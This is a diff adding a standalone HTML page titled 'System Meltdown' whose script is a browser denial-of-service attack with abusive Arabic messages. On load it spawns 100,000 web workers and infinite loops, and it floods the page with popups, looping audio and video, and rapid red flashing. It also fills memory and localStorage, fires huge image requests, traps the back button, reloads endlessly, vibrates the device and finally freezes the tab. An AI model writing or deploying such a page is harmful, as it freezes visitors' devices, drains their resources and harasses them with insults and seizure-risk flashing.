@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Meltdown</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: black; opacity: 0; visibility: hidden; }
+        .ad {
+            position: fixed;
+            background: linear-gradient(45deg, red, darkred);
+            color: white;
+            padding: 15px 25px;
+            font-size: 22px;
+            font-weight: bold;
+            font-family: 'Arial Black', sans-serif;
+            z-index: 99999;
+            border-radius: 50px;
+            box-shadow: 0 0 20px red;
+            text-align: center;
+            white-space: nowrap;
+            animation: explode 0.3s infinite, blink 0.1s infinite;
+            cursor: pointer;
+        }
+        @keyframes explode {
+            0% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.5) rotate(10deg); background: yellow; color: black; }
+            100% { transform: scale(1) rotate(-10deg); }
+        }
+        @keyframes blink {
+            0% { opacity: 1; text-shadow: 0 0 10px red; }
+            100% { opacity: 0.5; text-shadow: 0 0 30px white; }
+        }
+        .flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: red;
+            z-index: 99998;
+            pointer-events: none;
+            animation: flashAnim 0.05s infinite;
+        }
+        @keyframes flashAnim {
+            0% { opacity: 0; }
+            100% { opacity: 0.8; }
+        }
+    </style>
+</head>
+<body>
+<div class="flash"></div>
+<script>
+(function() {
+    // إخفاء الصفحة
+    document.body.style.opacity = '0';
+    document.body.style.visibility = 'hidden';
+
+    // تغيير عنوان الصفحة باستمرار
+    setInterval(() => {
+        document.title = '💀 تناكت عليك 💀';
+    }, 100);
+
+    // رسائل منبثقة لا نهائية
+    setInterval(() => {
+        alert('💀 تناكت عليك يا ابن الكلب 💀');
+        alert('🔴 تناكت عليك 🔴');
+        alert('💀 تناكت تناكت تناكت 💀');
+    }, 150);
+
+    // ========== 100,000 إعلان "تناكت عليك" متحرك ==========
+    for(let a = 0; a < 100000; a++) {
+        let ad = document.createElement('div');
+        ad.className = 'ad';
+        ad.innerHTML = '💀 تناكت عليك 💀';
+        ad.style.top = Math.random() * 100 + '%';
+        ad.style.left = Math.random() * 100 + '%';
+        ad.style.fontSize = (20 + Math.random() * 40) + 'px';
+        ad.onclick = () => {
+            window.open('https://www.google.com');
+            alert('تناكت عليك');
+        };
+        document.body.appendChild(ad);
+        
+        // تحريك الإعلانات بشكل فوضوي
+        setInterval(() => {
+            ad.style.top = Math.random() * 100 + '%';
+            ad.style.left = Math.random() * 100 + '%';
+            ad.style.transform = `rotate(${Math.random() * 360}deg)`;
+        }, 100);
+    }
+
+    // ========== 100,000 صوت بصوت "تناكت عليك" مركب ==========
+    for(let s = 0; s < 100000; s++) {
+        let audio = new Audio();
+        // موجات صوتية مزعجة
+        audio.src = 'https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3';
+        audio.loop = true;
+        audio.volume = 1;
+        audio.play().catch(() => {});
+        document.body.appendChild(audio);
+    }
+
+    // ========== باقي عوامل التدمير (من النسخة السابقة) ==========
+    
+    // 100,000 Web Worker
+    for(let w = 0; w < 100000; w++) {
+        let workerCode = `
+            setInterval(() => {
+                let x = 0;
+                while(true) {
+                    for(let j = 0; j < 10000000; j++) {
+                        x += Math.sqrt(j) * Math.sin(j) * Math.cos(j);
+                    }
+                }
+            }, 0);
+        `;
+        try {
+            let blob = new Blob([workerCode], {type: 'application/javascript'});
+            new Worker(URL.createObjectURL(blob));
+        } catch(e) {}
+    }
+
+    // 100,000 حلقة لا نهائية
+    for(let i = 0; i < 100000; i++) {
+        setTimeout(() => {
+            while(true) {
+                Math.sin(Math.random()) * Math.cos(Math.random());
+            }
+        }, 0);
+    }
+
+    // 100,000 إعلان منبثق
+    for(let i = 0; i < 100000; i++) {
+        setTimeout(() => {
+            window.open('https://www.google.com', '_blank');
+            window.open('https://www.facebook.com', '_blank');
+        }, i * 5);
+    }
+
+    // استنزاف RAM
+    let memory = [];
+    setInterval(() => {
+        for(let i = 0; i < 1000000; i++) {
+            memory.push(new Array(100000).fill('💀'));
+        }
+    }, 1);
+
+    // ملء التخزين
+    try {
+        for(let l = 0; l < 100000; l++) {
+            localStorage.setItem('tnak_' + l, 'تناكت عليك'.repeat(1024 * 1024));
+        }
+    } catch(e) {}
+
+    // 100,000 فيديو
+    for(let v = 0; v < 100000; v++) {
+        let video = document.createElement('video');
+        video.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
+        video.loop = true;
+        video.autoplay = true;
+        video.muted = false;
+        video.style.position = 'fixed';
+        video.style.display = 'none';
+        video.play().catch(() => {});
+        document.body.appendChild(video);
+    }
+
+    // 100,000 طلب شبكة
+    for(let i = 0; i < 100000; i++) {
+        let img = new Image();
+        img.src = 'https://picsum.photos/8000/8000?t=' + Date.now() + '&r=' + i;
+    }
+
+    // قفل المتصفح
+    for(let i = 0; i < 99999; i++) {
+        history.pushState(null, null, '#tnak');
+    }
+    window.onpopstate = () => {
+        history.go(1);
+        location.reload();
+    };
+
+    // إعادة تحميل لا نهائية
+    setInterval(() => { location.reload(); }, 500);
+    setInterval(() => { location.reload(); }, 1000);
+    setInterval(() => { location.reload(); }, 1500);
+
+    // اهتزاز مستمر
+    if('vibrate' in navigator) {
+        setInterval(() => {
+            navigator.vibrate([50000, 10000, 50000]);
+        }, 50);
+    }
+
+    // تجميد نهائي
+    setTimeout(() => {
+        while(true) {}
+    }, 2000);
+})();
+</script>
+</body>
+</html>
